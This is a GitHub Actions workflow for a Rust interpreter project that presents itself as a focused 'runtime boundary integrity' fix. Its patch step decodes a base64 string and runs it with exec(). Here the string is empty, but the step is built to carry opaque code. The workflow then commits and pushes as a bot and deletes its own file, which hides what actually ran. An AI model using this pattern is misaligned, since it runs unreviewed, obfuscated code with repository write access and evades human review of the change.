name: Runtime boundary integrity patch

on:
  push:
    branches:
      - fix/runtime-function-boundary-integrity

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: fix/runtime-function-boundary-integrity
          fetch-depth: 0
      - name: Apply focused patch
        shell: bash
        run: |
          python - <<'PY'
          import base64
          payload = ""
          exec(compile(base64.b64decode(payload), '<runtime-boundary-patch>', 'exec'))
          PY
      - name: Format and commit
        shell: bash
        run: |
          cargo fmt --all
          rm .github/workflows/runtime-boundary-patch.yml
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add crates/nova-interpreter/src/lib.rs crates/nova-interpreter/tests/function_boundary_integrity.rs README.md docs/roadmap.md .github/workflows/runtime-boundary-patch.yml
          git commit -m 'fix: validate runtime function boundaries'
          git push origin HEAD:fix/runtime-function-boundary-integrity
